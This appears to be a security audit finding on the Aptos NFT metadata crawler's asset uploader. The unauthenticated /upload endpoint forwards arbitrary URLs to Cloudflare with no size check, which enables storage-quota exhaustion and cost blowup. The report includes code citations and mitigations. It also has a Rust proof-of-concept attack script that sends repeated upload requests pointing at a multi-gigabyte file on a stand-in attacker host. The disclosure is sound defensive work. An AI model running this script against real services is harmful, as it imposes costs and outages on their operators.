# Audit Report

## Title
Unbounded Asset Upload to Cloudflare Enables Storage Quota Exhaustion and Cost Explosion in NFT Metadata Crawler

## Summary
The NFT metadata crawler's asset uploader service lacks size validation before instructing Cloudflare to fetch and store assets from user-supplied URLs. An unauthenticated attacker can submit URLs pointing to arbitrarily large files, causing Cloudflare to download and store them without limit, leading to storage quota exhaustion and significant financial costs. [1](#0-0) 

## Finding Description
The asset uploader workflow has three critical flaws that combine to create this vulnerability:

**1. No Authentication on Upload API**

The `/upload` endpoint accepts batch upload requests from any source without authentication. [2](#0-1) 

**2. No Size Validation in Upload Request Processing**

The `upload_batch()` function creates upload request records without validating the size of assets at the provided URLs. [3](#0-2) 

**3. Direct URL Forwarding to Cloudflare**

The worker's `upload_asset()` function instructs Cloudflare to fetch assets by passing the user-supplied URL directly in a multipart form. Cloudflare then downloads the asset from that URL without any prior size checking by the application. [4](#0-3) 

**Attack Flow:**
1. Attacker hosts extremely large files (multi-gigabyte) on their controlled server
2. Attacker sends POST request to `/upload` with URLs to these large files
3. System creates upload request records in database
4. Throttler picks up requests and calls worker
5. Worker instructs Cloudflare to fetch assets from attacker's URLs
6. Cloudflare downloads and stores the large files
7. Attacker repeats to exhaust storage quota

**Unused Size Limit:**
While a `DEFAULT_MAX_FILE_SIZE_BYTES` constant (15 MB) exists in the codebase for use by the image optimizer, it is NOT applied in the asset uploader flow. [5](#0-4) 

The image optimizer validates file sizes before processing, but the asset uploader bypasses this validation entirely. [6](#0-5) 

## Impact Explanation
This vulnerability represents a **High severity** issue for the NFT metadata crawler infrastructure:

**Financial Impact:**
- Cloudflare charges for storage and bandwidth
- Attacker can force download of gigabytes or terabytes of data
- Storage quota exhaustion prevents legitimate NFT assets from being uploaded
- Potential costs could reach thousands of dollars before detection

**Service Availability:**
- Once quota is exhausted, the service cannot upload any new NFT assets
- Legitimate users cannot utilize the NFT metadata crawler functionality
- Service degradation affects the entire NFT ecosystem on Aptos

While this does not directly impact blockchain consensus, validators, or on-chain security, it does affect critical infrastructure supporting the Aptos NFT ecosystem and represents significant financial and operational risk.

## Likelihood Explanation
**Likelihood: HIGH**

The attack is trivial to execute:
- No authentication required
- No special tools needed (simple HTTP POST request)
- Attacker only needs to host large files and send URLs
- No rate limiting observed in the code
- Attack can be automated and scaled

An attacker can set up the attack in minutes and cause immediate impact.

## Recommendation

Implement size validation at multiple layers:

**1. Add size validation before uploading to Cloudflare:**
```rust
async fn upload_asset(&self, url: &Url) -> anyhow::Result<impl IntoResponse + use<>> {
    let hashed_url = sha256::digest(url.to_string());
    
    // Validate file size before uploading
    let (_, size) = get_uri_metadata(url.as_str()).await?;
    if size > DEFAULT_MAX_FILE_SIZE_BYTES {
        return Err(anyhow::anyhow!(
            "Asset size {} bytes exceeds maximum allowed size of {} bytes",
            size,
            DEFAULT_MAX_FILE_SIZE_BYTES
        ));
    }
    
    let client = Client::builder()
        .timeout(Duration::from_secs(MAX_ASSET_UPLOAD_RETRY_SECONDS))
        .build()
        .context("Error building reqwest client")?;
    // ... rest of upload logic
}
```

**2. Add authentication to the upload API endpoint:**
Implement API key or JWT-based authentication to prevent unauthorized access.

**3. Add rate limiting:**
Limit the number of upload requests per IP address or authenticated user.

**4. Add URL validation:**
Validate that URLs point to legitimate domains and aren't localhost/internal IPs.

## Proof of Concept

```rust
// PoC: Attacker script to exhaust storage quota
use reqwest::Client;
use serde_json::json;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let asset_uploader_url = "http://nft-metadata-crawler:8080/upload";
    
    // Attacker hosts a 5GB file at this URL
    let malicious_url = "http://attacker-server.com/5gb-file.bin";
    
    // Send 100 upload requests
    for i in 0..100 {
        let response = client
            .post(asset_uploader_url)
            .json(&json!({
                "idempotency_key": format!("attack_{}", i),
                "application_id": "attack_app",
                "urls": [malicious_url]
            }))
            .send()
            .await?;
            
        println!("Request {}: Status {}", i, response.status());
    }
    
    // Total: 500GB of data will be uploaded to Cloudflare
    // At typical Cloudflare pricing, this could cost thousands of dollars
    
    Ok(())
}
```

## Notes

**Scope Clarification:**
This vulnerability affects the NFT metadata crawler service (ecosystem infrastructure), not the core Aptos blockchain protocol. It does not impact consensus, validators, Move VM, or on-chain state. However, it represents significant financial and operational risk to the NFT metadata indexing infrastructure.

**Defense in Depth:**
The recommended mitigations should be implemented in layers - size validation, authentication, and rate limiting - to provide comprehensive protection against this attack vector.

### Citations

**File:** ecosystem/nft-metadata-crawler/src/asset_uploader/worker/mod.rs (L69-104)
```rust
    async fn upload_asset(&self, url: &Url) -> anyhow::Result<impl IntoResponse + use<>> {
        let hashed_url = sha256::digest(url.to_string());
        let client = Client::builder()
            .timeout(Duration::from_secs(MAX_ASSET_UPLOAD_RETRY_SECONDS))
            .build()
            .context("Error building reqwest client")?;
        let form = Form::new()
            .text("id", hashed_url.clone())
            .text(
                // Save the asset_uri in the upload metadata to enable retrieval by asset_uri later
                "metadata",
                format!("{{\"asset_uri\": \"{}\"}}", url),
            )
            .text("url", url.to_string());

        info!(
            asset_uri = ?url,
            "[Asset Uploader] Uploading asset to Cloudflare"
        );

        let res = client
            .post(format!(
                "https://api.cloudflare.com/client/v4/accounts/{}/images/v1",
                self.config.cloudflare_account_id
            ))
            .header(
                "Authorization",
                format!("Bearer {}", self.config.cloudflare_auth_key),
            )
            .multipart(form)
            .send()
            .await
            .context("Error sending request to Cloudflare")?;

        reqwest_response_to_axum_response(res).await
    }
```

**File:** ecosystem/nft-metadata-crawler/src/asset_uploader/api/mod.rs (L138-148)
```rust
impl Server for AssetUploaderApiContext {
    fn build_router(&self) -> axum::Router {
        let self_arc = Arc::new(self.clone());
        axum::Router::new()
            .route("/upload", post(Self::handle_upload_batch))
            .route(
                "/status/:application_id/:idempotency_key",
                get(Self::handle_get_status),
            )
            .layer(Extension(self_arc.clone()))
    }
```

**File:** ecosystem/nft-metadata-crawler/src/asset_uploader/api/upload_batch.rs (L19-44)
```rust
pub fn upload_batch(
    pool: Pool<ConnectionManager<PgConnection>>,
    request: &BatchUploadRequest,
) -> anyhow::Result<IdempotencyTuple> {
    let mut conn = pool.get()?;
    let existing_rows = get_existing_rows(&mut conn, &request.urls)?;

    let mut request_statuses = vec![];
    for url in &request.urls {
        if let Some(cdn_image_uri) = existing_rows.get(url.as_str()) {
            request_statuses.push(AssetUploaderRequestStatuses::new_completed(
                &request.idempotency_tuple,
                url.as_str(),
                cdn_image_uri.as_deref().unwrap(), // Safe to unwrap because we checked for existence when querying
            ));
        } else {
            request_statuses.push(AssetUploaderRequestStatuses::new(
                &request.idempotency_tuple,
                url.as_str(),
            ));
        }
    }

    insert_request_statuses(&mut conn, &request_statuses)?;
    Ok(request.idempotency_tuple.clone())
}
```

**File:** ecosystem/nft-metadata-crawler/src/utils/constants.rs (L22-23)
```rust
/// Default 15 MB maximum file size for files to be downloaded
pub const DEFAULT_MAX_FILE_SIZE_BYTES: u32 = 15_000_000;
```

**File:** ecosystem/nft-metadata-crawler/src/utils/image_optimizer.rs (L42-50)
```rust
        if size > max_file_size_bytes {
            FAILED_TO_OPTIMIZE_IMAGE_COUNT
                .with_label_values(&["Image file too large"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "Image optimizer received file too large: {} bytes, skipping",
                size
            )));
        }
```
